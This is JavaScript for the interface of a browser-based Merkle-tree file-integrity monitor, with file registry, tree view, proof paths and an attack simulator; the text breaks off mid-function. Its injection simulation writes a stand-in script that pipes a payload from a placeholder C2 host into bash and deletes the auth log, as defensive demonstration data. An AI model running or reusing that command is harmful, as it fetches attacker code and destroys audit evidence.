/**
 * ═══════════════════════════════════════════════════════════
 *   MerkleGuard — UI Controller
 * ═══════════════════════════════════════════════════════════
 */

'use strict';

(function initMerkleGuardUI() {
  if (window.__MERKLE_GUARD_UI_LOADED__) {
    console.warn('MerkleGuard UI script loaded multiple times; skipping duplicate init.');
    return;
  }
  window.__MERKLE_GUARD_UI_LOADED__ = true;

const { FileRegistry } = window.MerkleGuardEngine;

// ─── State ────────────────────────────────────────────────
const registry = new FileRegistry();
let logs = [];
let alertCount = 0;
let scanCount = 0;
let realFolderHandle = null;
let realFolderPaths = [];
const REAL_FOLDER_FILE_LIMIT = 200;
const REAL_FOLDER_TEXT_LIMIT = 10000;

// ─── Boot Sequence ────────────────────────────────────────
(async function boot() {
  try {
    const msgs = [
      'Initializing SHA-256 engine...',
      'Loading Merkle Tree DSA module...',
      'Setting up file registry...',
      'Calibrating integrity sensors...',
      'System ready.'
    ];
    const fill = document.getElementById('boot-fill');
    const status = document.getElementById('boot-status');

    for (let i = 0; i < msgs.length; i++) {
      await sleep(350 + Math.random() * 200);
      status.textContent = msgs[i];
      fill.style.width = `${((i + 1) / msgs.length) * 100}%`;
    }

    await sleep(400);
    document.getElementById('boot-screen').style.opacity = '0';
    await sleep(400);
    document.getElementById('boot-screen').style.display = 'none';
    document.getElementById('app').classList.remove('hidden');

    startClock();
    addLog('INFO', 'MerkleGuard v2.0 started', 'system');
    renderEfficiencyTable();
  } catch (err) {
    console.error('Boot error:', err);
    showBootFallback(`Boot error: ${err.message}`);
  }
})();

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
function showBootFallback(message) {
  const status = document.getElementById('boot-status');
  const fill = document.getElementById('boot-fill');
  if (status) status.textContent = message;
  if (fill) fill.style.width = '100%';
  const boot = document.getElementById('boot-screen');
  const app = document.getElementById('app');
  if (boot) boot.style.display = 'none';
  if (app) app.classList.remove('hidden');
}

window.addEventListener('error', (event) => {
  const msg = event && event.message ? event.message : 'Unexpected script error';
  showBootFallback(`Error: ${msg}`);
});

setTimeout(() => {
  const app = document.getElementById('app');
  if (app && app.classList.contains('hidden')) {
    showBootFallback('Boot timeout. Open DevTools Console to inspect the exact error.');
  }
}, 7000);

// ─── Clock ────────────────────────────────────────────────
function startClock() {
  const tick = () => {
    document.getElementById('sys-clock').textContent =
      new Date().toLocaleTimeString('en-IN', { hour12: false });
  };
  tick();
  setInterval(tick, 1000);
}

// ─── Navigation ───────────────────────────────────────────
document.querySelectorAll('.nav-item').forEach(item => {
  item.addEventListener('click', () => {
    const tab = item.dataset.tab;
    document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
    document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
    item.classList.add('active');
    document.getElementById('panel-' + tab).classList.add('active');

    const titles = {
      dashboard: ['Dashboard', 'System overview'],
      files: ['File Registry', 'Monitored files'],
      tree: ['Merkle Tree', 'Live tree visualization'],
      proofpath: ['Proof Path', 'O(log n) verification'],
      simulate: ['Attack Simulator', 'Cybersecurity scenarios'],
      logs: ['Audit Log', 'Event history'],
      about: ['DSA Notes', 'Data structures & algorithms']
    };
    document.getElementById('page-title').textContent = titles[tab][0];
    document.getElementById('page-sub').textContent = titles[tab][1];

    if (tab === 'tree') renderMerkleTreeSVG();
    if (tab === 'proofpath') populateProofSelect();
    if (tab === 'files') renderFileList();
  });
});

// ─── File Input ───────────────────────────────────────────
const dropZone = document.getElementById('drop-zone');
if (dropZone) {
  dropZone.addEventListener('click', () => document.getElementById('file-input').click());
  dropZone.addEventListener('dragover', e => { e.preventDefault(); dropZone.classList.add('dragging'); });
  dropZone.addEventListener('dragleave', () => dropZone.classList.remove('dragging'));
  dropZone.addEventListener('drop', async e => {
    e.preventDefault();
    dropZone.classList.remove('dragging');
    await processFiles(e.dataTransfer.files);
  });
}

async function handleFileInput(event) {
  await processFiles(event.target.files);
  event.target.value = '';
}

async function processFiles(fileList) {
  let added = 0;
  for (const file of fileList) {
    const content = await readFileAsText(file);
    await registry.addFile(file.name, content);
    addLog('INFO', `File added: ${file.name}`, file.name);
    added++;
  }
  if (added > 0) {
    await registry._rebuildTree();
    refreshAll();
    addLog('INFO', `${added} file(s) added. Run baseline snapshot when ready.`, 'system');
  }
}

function readFileAsText(file) {
  return new Promise((res) => {
    const reader = new FileReader();
    reader.onload = e => res(e.target.result);
    reader.onerror = () => res(`[binary: ${file.size} bytes]`);
    reader.readAsText(file);
  });
}

// ─── Folder Picker (File System Access API) ───────────────
async function openFolderPicker() {
  const statusEl = document.getElementById('folder-status');
  if (!window.isSecureContext) {
    statusEl.textContent = '⚠ Open via http://localhost:8080 in Chrome/Edge (not file:// or raw IP).';
    statusEl.className = 'folder-status warn';
    return;
  }
  if (!window.showDirectoryPicker) {
    statusEl.textContent = '⚠ Use Chrome or Edge for real folder access.';
    statusEl.className = 'folder-status warn';
    return;
  }
  try {
    realFolderHandle = await window.showDirectoryPicker({ mode: 'read' });
    statusEl.textContent = `Reading "${realFolderHandle.name}"...`;
    const count = await loadRealFolderFiles();
    statusEl.textContent = `✓ Loaded ${count} file(s) from "${realFolderHandle.name}"`;
    statusEl.className = 'folder-status ok';
    addLog('INFO', `Real folder loaded: ${realFolderHandle.name} (${count} file(s))`, 'system');
    refreshAll();
  } catch (e) {
    if (e.name !== 'AbortError') {
      statusEl.textContent = `Error: ${e.message}`;
      statusEl.className = 'folder-status warn';
    }
  }
}

async function collectFolderFileEntries(dirHandle, prefix = '', bucket = []) {
  for await (const [name, handle] of dirHandle.entries()) {
    if (bucket.length >= REAL_FOLDER_FILE_LIMIT) break;
    const relPath = prefix ? `${prefix}/${name}` : name;
    if (handle.kind === 'file') {
      bucket.push([relPath, handle]);
      continue;
    }
    await collectFolderFileEntries(handle, relPath, bucket);
  }
  return bucket;
}

async function loadRealFolderFiles() {
  if (!realFolderHandle) return 0;

  const entries = await collectFolderFileEntries(realFolderHandle);

  // Remove previously loaded folder files so deletes are reflected.
  for (const path of realFolderPaths) registry.removeFile(path);
  realFolderPaths = [];

  for (const [relPath, handle] of entries) {
    const file = await handle.getFile();
    const text = await file.text().catch(() => `[binary file: ${file.size} bytes]`);
    await registry.addFile(relPath, text.slice(0, REAL_FOLDER_TEXT_LIMIT));
    realFolderPaths.push(relPath);
  }

  await registry._rebuildTree();
  return realFolderPaths.length;
}

async function syncRealFolderBeforeAction(actionLabel) {
  if (!realFolderHandle) return true;
  const statusEl = document.getElementById('folder-status');
  try {
    statusEl.textContent = `Syncing folder before ${actionLabel}...`;
    const count = await loadRealFolderFiles();
    statusEl.textContent = `✓ Synced ${count} file(s) from "${realFolderHandle.name}"`;
    statusEl.className = 'folder-status ok';
    return true;
  } catch (e) {
    statusEl.textContent = `Error while syncing folder: ${e.message}`;
    statusEl.className = 'folder-status warn';
    addLog('ALERT', `Real folder sync failed before ${actionLabel}: ${e.message}`, 'system');
    return false;
  }
}

// ─── Presets ──────────────────────────────────────────────
async function addPresetLinux() {
  const files = [
    ['etc/passwd',       'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin'],
    ['etc/shadow',       'root:$6$xyz$abc...:19000:0:99999:7:::'],
    ['etc/hosts',        '127.0.0.1 localhost\n::1 localhost ip6-localhost\n192.168.1.1 router.local'],
    ['etc/ssh/sshd_config', 'Port 22\nPermitRootLogin no\nPasswordAuthentication no\nPubkeyAuthentication yes'],
    ['var/log/auth.log', 'Apr 17 09:01:00 server sshd[1234]: Accepted publickey for admin from 192.168.1.10\nApr 17 09:01:01 server sudo: admin: TTY=pts/0 ; CMD=/bin/bash'],
    ['srv/app/server.js','const express = require("express");\nconst app = express();\napp.listen(3000);'],
    ['srv/app/.env',     'DB_HOST=localhost\nDB_PASS=s3cr3t\nJWT_SECRET=supersecretkey123'],
    ['home/admin/.bashrc','export PATH=$PATH:/usr/local/bin\nalias ll="ls -la"\nalias grep="grep --color=auto"'],
  ];
  for (const [name, content] of files) await registry.addFile(name, content);
  await registry._rebuildTree();
  addLog('INFO', 'Linux system file preset loaded (8 files)', 'system');
  refreshAll();
}

async function addPresetWebApp() {
  const files = [
    ['src/index.js',      'import React from "react";\nimport ReactDOM from "react-dom";\nReactDOM.render(<App/>, document.getElementById("root"));'],
    ['src/App.jsx',       'export default function App() { return <div>Hello World</div>; }'],
    ['src/api/auth.js',   'const JWT_SECRET = process.env.JWT_SECRET;\nexport const verify = (token) => jwt.verify(token, JWT_SECRET);'],
    ['src/db/schema.sql', 'CREATE TABLE users (id SERIAL PRIMARY KEY, email TEXT UNIQUE, hash TEXT);\nCREATE TABLE sessions (id UUID PRIMARY KEY, user_id INT REFERENCES users(id));'],
    ['package.json',      '{"name":"webapp","version":"1.0.0","dependencies":{"react":"^18.0","express":"^4.18"}}'],
    ['nginx.conf',        'server { listen 443 ssl; ssl_certificate /etc/ssl/cert.pem; location / { proxy_pass http://localhost:3000; } }'],
    ['Dockerfile',        'FROM node:18-alpine\nWORKDIR /app\nCOPY . .\nRUN npm install\nCMD ["node","src/index.js"]'],
    ['README.md',         '# Web Application\n\nSecurity-critical deployment. Do not modify without authorization.\n\nVersion: 2.0.0'],
  ];
  for (const [name, content] of files) await registry.addFile(name, content);
  await registry._rebuildTree();
  addLog('INFO', 'Web app file preset loaded (8 files)', 'system');
  refreshAll();
}

// ─── Core Actions ─────────────────────────────────────────
async function takeSnapshot() {
  if (registry.size() === 0) { alert('Add files first.'); return; }
  const synced = await syncRealFolderBeforeAction('baseline');
  if (!synced) return;
  const root = await registry.takeBaseline();
  addLog('OK', `Baseline snapshot taken. Root: ${root.slice(0, 16)}...`, 'system');
  showAlert(false);
  refreshAll();
  updateSysStatus('ok');
}

async function scanFiles() {
  if (registry.size() === 0) { alert('Add files first.'); return; }
  if (!registry.getBaselineRoot()) { alert('Take a baseline snapshot first.'); return; }
  const synced = await syncRealFolderBeforeAction('scan');
  if (!synced) return;
  scanCount++;
  const tampered = await registry.scan();
  addLog('INFO', `Integrity scan #${scanCount} complete`, 'system');

  if (tampered.length > 0) {
    tampered.forEach(f => addLog('ALERT', `Hash mismatch detected: ${f}`, f));
    showAlert(true, `⚠ ${tampered.length} file(s) tampered: ${tampered.join(', ')}`);
    updateSysStatus('alert');
  } else {
    addLog('OK', 'All files verified — integrity intact', 'system');
    showAlert(false);
    updateSysStatus('ok');
  }
  refreshAll();
}

function resetAll() {
  if (!confirm('Reset all files and logs?')) return;
  registry._map.clear();
  registry.baselineRoot = null;
  registry.currentTree = null;
  registry.baselineTree = null;
  logs = [];
  alertCount = 0;
  scanCount = 0;
  showAlert(false);
  updateSysStatus('ok');
  refreshAll();
  addLog('INFO', 'System reset', 'system');
}

// ─── Refresh All UI ───────────────────────────────────────
async function refreshAll() {
  updateMetrics();
  updateRootPill();
  updateHashCompare();
  renderFileList();
  renderLogs();
  renderMerkleTreeSVG();
  populateProofSelect();
  updateBadges();
  renderActivity();
}

// ─── Metrics ──────────────────────────────────────────────
function updateMetrics() {
  const files = registry.getAllFiles();
  const total = files.length;
  const secure = files.filter(f => f.status === 'ok').length;
  const tampered = files.filter(f => f.status === 'tampered').length;
  const depth = registry.currentTree ? registry.currentTree.depth : 0;

  document.getElementById('m-total').textContent    = total;
  document.getElementById('m-secure').textContent   = secure;
  document.getElementById('m-tampered').textContent = tampered;
  document.getElementById('m-depth').textContent    = depth;

  document.getElementById('stat-leaves').textContent   = total;
  document.getElementById('stat-internal').textContent = registry.currentTree ? registry.currentTree.countInternalNodes() : 0;
  document.getElementById('stat-depth').textContent    = depth;
  document.getElementById('stat-ops').textContent      = total > 0 ? `~${depth} checks` : '—';
}

function updateRootPill() {
  const cur = registry.getCurrentRoot();
  const base = registry.getBaselineRoot();
  const pill = document.getElementById('root-pill');
  const val  = document.getElementById('root-pill-val');
  const status = document.getElementById('root-pill-status');

  if (!cur) { val.textContent = '—'; status.textContent = 'NO BASELINE'; status.className = 'root-pill-status'; return; }
  val.textContent = cur.slice(0, 20) + '...';

  if (!base) {
    status.textContent = 'NO BASELINE';
    status.className = 'root-pill-status';
    pill.className = 'root-pill';
  } else if (cur === base) {
    status.textContent = 'VERIFIED';
    status.className = 'root-pill-status ok';
    pill.className = 'root-pill ok';
  } else {
    status.textContent = 'MISMATCH';
    status.className = 'root-pill-status alert';
    pill.className = 'root-pill alert';
  }
}

function updateHashCompare() {
  const base = registry.getBaselineRoot();
  const cur  = registry.getCurrentRoot();
  document.getElementById('hc-baseline').textContent = base ? base.slice(0, 32) + '...' : '—';
  document.getElementById('hc-current').textContent  = cur  ? cur.slice(0, 32) + '...'  : '—';
  const matchEl = document.getElementById('hc-match');
  if (!base || !cur) {
    matchEl.textContent = '—'; matchEl.className = 'hash-val';
  } else if (base === cur) {
    matchEl.textContent = '✓ MATCH'; matchEl.className = 'hash-val green';
  } else {
    matchEl.textContent = '✗ MISMATCH'; matchEl.className = 'hash-val red';
  }
}

function updateBadges() {
  document.getElementById('badge-files').textContent = registry.size();
  const alerts = logs.filter(l => l.level === 'ALERT').length;
  const badge = document.getElementById('badge-alerts');
  badge.textContent = alerts;
  badge.style.display = alerts ? '' : 'none';
}

function updateSysStatus(state) {
  const dot = document.getElementById('sys-dot');
  const label = document.getElementById('sys-label');
  if (state === 'alert') {
    dot.className = 'sys-dot alert';
    label.textContent = 'ALERT';
  } else if (state === 'warn') {
    dot.className = 'sys-dot warn';
    label.textContent = 'WARNING';
  } else {
    dot.className = 'sys-dot ok';
    label.textContent = 'SECURE';
  }
}

// ─── File List ────────────────────────────────────────────
function renderFileList() {
  const tbody = document.getElementById('file-tbody');
  const empty = document.getElementById('table-empty');
  const search = document.getElementById('file-search').value.toLowerCase();
  const filter = document.getElementById('filter-status').value;

  let files = registry.getAllFiles()
    .filter(f => !search || f.filename.toLowerCase().includes(search))
    .filter(f => filter === 'all' || f.status === filter);

  if (!files.length) {
    tbody.innerHTML = '';
    empty.classList.remove('hidden');
    return;
  }
  empty.classList.add('hidden');

  tbody.innerHTML = files.map(f => `
    <tr class="file-row ${f.status}">
      <td><input type="checkbox" class="row-check" data-name="${f.filename}"/></td>
      <td class="mono file-name-cell">${escapeHtml(f.filename)}</td>
      <td><span class="badge badge-${f.status}">${f.status.toUpperCase()}</span></td>
      <td class="mono hash-cell">${f.baselineHash ? f.baselineHash.slice(0, 16) + '...' : '—'}</td>
      <td class="mono hash-cell">${f.currentHash.slice(0, 16)}...</td>
      <td class="mono">${formatBytes(f.size)}</td>
      <td>
        <button class="btn btn-xs btn-outline" onclick="viewFileDetail('${escapeHtml(f.filename)}')">View</button>
        <button class="btn btn-xs btn-danger" onclick="deleteFile('${escapeHtml(f.filename)}')">Remove</button>
      </td>
    </tr>
  `).join('');
}

function toggleSelectAll(cb) {
  document.querySelectorAll('.row-check').forEach(c => c.checked = cb.checked);
}

function removeSelected() {
  const checked = document.querySelectorAll('.row-check:checked');
  checked.forEach(c => {
    registry.removeFile(c.dataset.name);
    addLog('WARN', `File removed: ${c.dataset.name}`, c.dataset.name);
  });
  if (checked.length) {
    registry._rebuildTree().then(refreshAll);
  }
}

async function deleteFile(name) {
  registry.removeFile(name);
  await registry._rebuildTree();
  addLog('WARN', `File removed from registry: ${name}`, name);
  refreshAll();
}

function viewFileDetail(name) {
  const f = registry.getFile(name);
  if (!f) return;
  const modal = `
    <div style="position:fixed;inset:0;background:rgba(0,0,0,0.8);z-index:1000;display:flex;align-items:center;justify-content:center;" onclick="this.remove()">
      <div style="background:var(--card-bg);border:1px solid var(--border);border-radius:12px;padding:24px;max-width:600px;width:90%;max-height:80vh;overflow-y:auto;" onclick="event.stopPropagation()">
        <h3 style="font-family:var(--font-mono);color:var(--accent);margin-bottom:12px;">${escapeHtml(name)}</h3>
        <div style="margin-bottom:8px;font-size:12px;color:var(--text-muted)">Baseline: <span style="color:var(--text-primary);font-family:var(--font-mono)">${f.baselineHash || '—'}</span></div>
        <div style="margin-bottom:16px;font-size:12px;color:var(--text-muted)">Current:  <span style="color:var(--text-primary);font-family:var(--font-mono)">${f.currentHash}</span></div>
        <pre style="background:var(--bg-secondary);border-radius:8px;padding:12px;font-size:11px;overflow-x:auto;max-height:300px;overflow-y:auto">${escapeHtml(String(f.content).slice(0,2000))}</pre>
        <button style="margin-top:12px;padding:6px 16px;border-radius:6px;background:var(--accent);color:#000;border:none;cursor:pointer;font-weight:600" onclick="this.closest('[onclick]').remove()">Close</button>
      </div>
    </div>
  `;
  document.body.insertAdjacentHTML('beforeend', modal);
}

// ─── Merkle Tree SVG Renderer ─────────────────────────────
function renderMerkleTreeSVG() {
  const svg = document.getElementById('tree-svg');
  if (!svg) return;
  const tree = registry.currentTree;

  if (!tree || !tree.root) {
    svg.innerHTML = '<text x="50%" y="50%" text-anchor="middle" font-family="Space Mono,monospace" font-size="13" fill="var(--text-muted)">Add files to see the Merkle Tree</text>';
    svg.setAttribute('viewBox', '0 0 660 200');
    document.getElementById('tree-info').textContent = 'No files';
    return;
  }

  const levels = tree.getLevels();
  const N = levels[levels.length - 1].length; // leaf count
  document.getElementById('tree-info').textContent = `${N} files · ${levels.length} levels · O(log ${N}) detection`;

  const W = 760;
  const NODE_H = 42;
  const LEVEL_GAP = 70;
  const svgH = levels.length * LEVEL_GAP + NODE_H + 40;

  // Assign x positions
  const leafCount = levels[levels.length - 1].length;
  const leafSpacing = Math.min(120, Math.max(70, (W - 40) / leafCount));
  const leafStart = (W - (leafCount - 1) * leafSpacing) / 2;

  // Give positions to all nodes bottom-up
  const leafLevel = levels[levels.length - 1];
  leafLevel.forEach((node, i) => {
    node._x = leafStart + i * leafSpacing;
    node._y = (levels.length - 1) * LEVEL_GAP + 20;
  });

  for (let l = levels.length - 2; l >= 0; l--) {
    levels[l].forEach((node, i) => {
      const childLevel = levels[l + 1];
      const leftChild  = childLevel[i * 2];
      const rightChild = childLevel[i * 2 + 1];
      if (leftChild && rightChild) {
        node._x = (leftChild._x + rightChild._x) / 2;
      } else if (leftChild) {
        node._x = leftChild._x;
      }
      node._y = l * LEVEL_GAP + 20;
    });
  }

  const isCompromised = registry.isCompromised();

  let edgesHtml = '';
  let nodesHtml = '';

  // Draw edges
  for (let l = 0; l < levels.length - 1; l++) {
    levels[l].forEach((node, i) => {
      const childLevel = levels[l + 1];
      const leftChild  = childLevel[i * 2];
      const rightChild = childLevel[i * 2 + 1];
      if (leftChild) {
        edgesHtml += `<line x1="${node._x}" y1="${node._y + NODE_H}" x2="${leftChild._x}" y2="${leftChild._y}" stroke="${leftChild.status !== 'ok' ? 'var(--red)' : 'var(--border-dim)'}" stroke-width="${leftChild.status !== 'ok' ? 1.5 : 0.7}" stroke-dasharray="${leftChild.status !== 'ok' ? '4,3' : 'none'}"/>`;
      }
      if (rightChild) {
        edgesHtml += `<line x1="${node._x}" y1="${node._y + NODE_H}" x2="${rightChild._x}" y2="${rightChild._y}" stroke="${rightChild.status !== 'ok' ? 'var(--red)' : 'var(--border-dim)'}" stroke-width="${rightChild.status !== 'ok' ? 1.5 : 0.7}" stroke-dasharray="${rightChild.status !== 'ok' ? '4,3' : 'none'}"/>`;
      }
    });
  }

  // Draw nodes
  levels.forEach((level, li) => {
    const isLeafLevel = li === levels.length - 1;
    const isRootLevel = li === 0;
    level.forEach(node => {
      const nodeW = isRootLevel ? 130 : isLeafLevel ? Math.min(110, leafSpacing - 8) : 90;
      let fill, stroke, textColor;

      if (isRootLevel) {
        if (isCompromised && registry.getBaselineRoot()) {
          fill = 'rgba(229,78,78,0.15)'; stroke = 'var(--red)'; textColor = 'var(--red)';
        } else if (registry.getBaselineRoot()) {
          fill = 'rgba(0,255,136,0.1)'; stroke = 'var(--accent)'; textColor = 'var(--accent)';
        } else {
          fill = 'rgba(255,180,0,0.1)'; stroke = 'var(--amber)'; textColor = 'var(--amber)';
        }
      } else if (node.status === 'tampered') {
        fill = 'rgba(229,78,78,0.12)'; stroke = 'var(--red)'; textColor = 'var(--red)';
      } else if (node.status === 'added') {
        fill = 'rgba(59,130,246,0.12)'; stroke = 'var(--blue)'; textColor = 'var(--blue)';
      } else {
        fill = 'var(--node-bg)'; stroke = 'var(--border)'; textColor = 'var(--text-secondary)';
      }

      const label = isLeafLevel && node.filename
        ? node.filename.split('/').pop().slice(0, 12)
        : node.hash.slice(0, 8) + '...';
      const subLabel = node.hash.slice(0, 12) + '...';

      nodesHtml += `
        <g class="tree-node">
          <rect x="${node._x - nodeW/2}" y="${node._y}" width="${nodeW}" height="${NODE_H}" rx="6"
            fill="${fill}" stroke="${stroke}" stroke-width="${isRootLevel ? 1.5 : 1}"/>
          ${isRootLevel ? `<text x="${node._x}" y="${node._y + 13}" text-anchor="middle" font-size="8" font-family="Space Mono,monospace" fill="${textColor}" opacity="0.6" font-weight="700">ROOT</text>` : ''}
          <text x="${node._x}" y="${node._y + (isRootLevel ? 24 : 16)}" text-anchor="middle" font-size="${isLeafLevel ? 10 : 9}" font-family="Space Mono,monospace" fill="${textColor}" font-weight="600">${escapeHtml(label)}</text>
          <text x="${node._x}" y="${node._y + (isRootLevel ? 35 : 30)}" text-anchor="middle" font-size="8" font-family="Space Mono,monospace" fill="${textColor}" opacity="0.55">${subLabel}</text>
        </g>`;
    });
  });

  svg.setAttribute('viewBox', `0 0 ${W} ${svgH}`);
  svg.innerHTML = edgesHtml + nodesHtml;
}

// ─── Proof Path ───────────────────────────────────────────
function populateProofSelect() {
  const sel = document.getElementById('proof-file-select');
  const filenames = registry.getFilenames();
  sel.innerHTML = '<option value="">— Choose a file —</option>' +
    filenames.map(f => `<option value="${escapeHtml(f)}">${escapeHtml(f)}</option>`).join('');
}

function generateProof() {
  const name = document.getElementById('proof-file-select').value;
  if (!name) { alert('Select a file first.'); return; }
  const tree = registry.currentTree;
  if (!tree || !tree.root) { alert('No tree built yet. Add files first.'); return; }

  const path = tree.getProofPath(name);
  const resultCard = document.getElementById('proof-result');
  resultCard.style.display = '';

  document.getElementById('proof-filename').textContent = `Proof for: ${name}`;
  const valid = registry.getBaselineRoot()
    ? (registry.getFile(name)?.status === 'ok')
    : true;
  const badge = document.getElementById('proof-valid-badge');
  badge.textContent = valid ? 'VALID' : 'TAMPERED';
  badge.className = 'badge ' + (valid ? 'badge-ok' : 'badge-tampered');

  if (!path || path.length === 0) {
    document.getElementById('proof-chain').innerHTML = '<div class="proof-node">Proof path not available.</div>';
    return;
  }

  const chain = document.getElementById('proof-chain');
  chain.innerHTML = path.map((step, i) => `
    <div class="proof-step ${step.isSibling ? 'sibling' : step.isLeaf ? 'leaf' : step.isRoot ? 'root-step' : ''}">
      <div class="proof-step-num">${i + 1}</div>
      <div class="proof-step-content">
        <div class="proof-step-type">${step.isLeaf ? '◆ LEAF' : step.isSibling ? '◈ SIBLING' : step.isRoot ? '⬡ ROOT' : '◉ INTERNAL'}</div>
        <div class="proof-step-hash mono">${step.hash}</div>
        <div class="proof-step-label">${step.isLeaf ? name : step.isSibling ? 'Used to verify parent' : step.isRoot ? 'Root — compare with baseline' : 'Combined hash of children'}</div>
      </div>
    </div>
  `).join('<div class="proof-connector">↓ SHA-256 combine</div>');

  const leafCount = registry.size();
  document.getElementById('proof-summary').innerHTML = `
    <div class="proof-summary-inner">
      <span>🔢 Steps needed: <strong>${path.filter(s => !s.isSibling).length}</strong></span>
      <span>📁 Total files: <strong>${leafCount}</strong></span>
      <span>⚡ Naive check: <strong>${leafCount} steps</strong></span>
      <span>🚀 Merkle: <strong>~${Math.ceil(Math.log2(Math.max(leafCount, 1))) + 1} steps</strong></span>
    </div>
  `;
}

// ─── Efficiency Table ─────────────────────────────────────
function renderEfficiencyTable() {
  const rows = [10, 100, 1000, 10000, 1000000];
  document.getElementById('efficiency-tbody').innerHTML = rows.map(n => `
    <tr>
      <td class="mono">${n.toLocaleString()}</td>
      <td class="mono red">${n.toLocaleString()} checks</td>
      <td class="mono green">~${Math.ceil(Math.log2(n))} checks</td>
      <td class="mono">${Math.round(n / Math.ceil(Math.log2(n)))}x faster</td>
    </tr>
  `).join('');
}

// ─── Attack Simulations ───────────────────────────────────
function showSimResult(title, lines, status = 'DETECTED') {
  const card = document.getElementById('sim-result-card');
  const terminal = document.getElementById('sim-terminal');
  const badge = document.getElementById('sim-badge');
  card.style.display = '';
  badge.textContent = status;
  badge.className = 'badge ' + (status === 'DETECTED' ? 'badge-tampered' : status === 'SAFE' ? 'badge-ok' : 'badge-warn');
  terminal.innerHTML = '';

  let i = 0;
  const writeNext = () => {
    if (i >= lines.length) return;
    const line = lines[i++];
    const el = document.createElement('div');
    el.className = 'term-line ' + (line.type || 'info');
    el.textContent = line.text;
    terminal.appendChild(el);
    terminal.scrollTop = terminal.scrollHeight;
    setTimeout(writeNext, line.delay || 120);
  };
  writeNext();
}

async function simByteFlip() {
  const filenames = registry.getFilenames();
  if (!filenames.length) { alert('Add and baseline files first.'); return; }
  if (!registry.getBaselineRoot()) { await takeSnapshot(); }

  const target = filenames[Math.floor(Math.random() * filenames.length)];
  const f = registry.getFile(target);
  await registry.modifyFile(target, f.content + '\x00');
  f.status = 'tampered';
  await registry._rebuildTree();
  refreshAll();
  addLog('ALERT', `ATTACK: Byte flip on ${target}`, target);

  showSimResult('Byte Flip Attack', [
    { text: '[*] Attacker initiated byte-flip attack...', type: 'info', delay: 0 },
    { text: `[*] Target: ${target}`, type: 'info', delay: 200 },
    { text: '[*] Appending null byte (0x00) to file...', type: 'info', delay: 400 },
    { text: '[!] File modified. Content changed by 1 byte.', type: 'warn', delay: 700 },
    { text: '', delay: 900 },
    { text: '[MerkleGuard] Running integrity check...', type: 'info', delay: 1100 },
    { text: `[MerkleGuard] Old root: ${registry.getBaselineRoot()?.slice(0, 32)}...`, type: 'info', delay: 1400 },
    { text: `[MerkleGuard] New root: ${registry.getCurrentRoot()?.slice(0, 32)}...`, type: 'alert', delay: 1700 },
    { text: '[MerkleGuard] ROOT HASH MISMATCH DETECTED!', type: 'alert', delay: 2000 },
    { text: '[MerkleGuard] Traversing tree (DFS, O(log n))...', type: 'info', delay: 2300 },
    { text: `[MerkleGuard] >>> TAMPERED FILE: ${target}`, type: 'alert', delay: 2600 },
    { text: '[MerkleGuard] Alert dispatched. File quarantine recommended.', type: 'alert', delay: 3000 },
  ]);
}

async function simInject() {
  if (!registry.getBaselineRoot()) { await addPresetLinux(); await takeSnapshot(); }
  const injName = `tmp/injected_${Date.now()}.sh`;
  await registry.addFile(injName, `#!/bin/bash\ncurl -s http://c2.evil.com/payload | bash -s\nrm -f /var/log/auth.log`);
  registry.getFile(injName).status = 'added';
  await registry._rebuildTree();
  refreshAll();
  addLog('ALERT', `ATTACK: Unauthorized file injected — ${injName}`, injName);

  showSimResult('Malicious Injection', [
    { text: '[*] Attacker planting backdoor script...', type: 'info', delay: 0 },
    { text: `[*] Writing: ${injName}`, type: 'info', delay: 300 },
    { text: '[*] Script content: curl | bash (classic C2 callback)', type: 'warn', delay: 600 },
    { text: '[*] Attacker believes injection is stealthy...', type: 'info', delay: 900 },
    { text: '', delay: 1100 },
    { text: '[MerkleGuard] New file detected in monitored directory!', type: 'alert', delay: 1400 },
    { text: '[MerkleGuard] Tree structure changed — new leaf node added.', type: 'alert', delay: 1700 },
    { text: '[MerkleGuard] Root hash changed immediately.', type: 'alert', delay: 2000 },
    { text: `[MerkleGuard] >>> UNAUTHORIZED FILE: ${injName}`, type: 'alert', delay: 2300 },
    { text: '[MerkleGuard] Flagging for immediate review.', type: 'alert', delay: 2600 },
  ]);
}

async function simDelete() {
  const filenames = registry.getFilenames();
  if (!filenames.length || !registry.getBaselineRoot()) { await addPresetLinux(); await takeSnapshot(); }
  const target = filenames[0];
  registry.getFile(target).status = 'deleted';
  await registry._rebuildTree();
  refreshAll();
  addLog('ALERT', `ATTACK: File deletion detected — ${target}`, target);

  showSimResult('File Deletion', [
    { text: '[*] Attacker deleting critical system file...', type: 'info', delay: 0 },
    { text: `[*] rm -f ${target}`, type: 'warn', delay: 400 },
    { text: '[*] File removed from disk. Visual check shows nothing.', type: 'info', delay: 800 },
    { text: '', delay: 1000 },
    { text: '[MerkleGuard] Missing leaf node in tree detected!', type: 'alert', delay: 1300 },
    { text: '[MerkleGuard] Parent node hash changed due to missing child.', type: 'alert', delay: 1600 },
    { text: '[MerkleGuard] Root hash mismatch confirmed.', type: 'alert', delay: 1900 },
    { text: `[MerkleGuard] >>> DELETED FILE: ${target}`, type: 'alert', delay: 2200 },
  ]);
}

async function simTimestamp() {
  const filenames = registry.getFilenames();
  if (!filenames.length || !registry.getBaselineRoot()) { await addPresetLinux(); await takeSnapshot(); }
  const target = filenames[0];
  // Timestamp change = no content change = status stays ok
  const f = registry.getFile(target);
  // content unchanged, just "touch"
  addLog('INFO', `Metadata-only change on ${target} — no alert (correct)`, target);
  refreshAll();

  showSimResult('Metadata Spoof', [
    { text: '[*] Attacker changing file timestamp...', type: 'info', delay: 0 },
    { text: `[*] touch -t 203001010000 ${target}`, type: 'warn', delay: 400 },
    { text: '[*] Timestamp changed. File looks "modified" in ls -la.', type: 'info', delay: 800 },
    { text: '[*] Attacker hopes to confuse file watchers...', type: 'info', delay: 1100 },
    { text: '', delay: 1300 },
    { text: '[MerkleGuard] Running content hash check...', type: 'info', delay: 1600 },
    { text: `[MerkleGuard] Hash of ${target}: UNCHANGED`, type: 'ok', delay: 1900 },
    { text: '[MerkleGuard] Root hash: UNCHANGED', type: 'ok', delay: 2200 },
    { text: '[MerkleGuard] ALL CLEAR — Merkle checks content, not metadata.', type: 'ok', delay: 2500 },
    { text: '[MerkleGuard] Timestamp spoofing has NO EFFECT on integrity.', type: 'ok', delay: 2800 },
  ], 'SAFE');
}

async function simMassCompromise() {
  const filenames = registry.getFilenames();
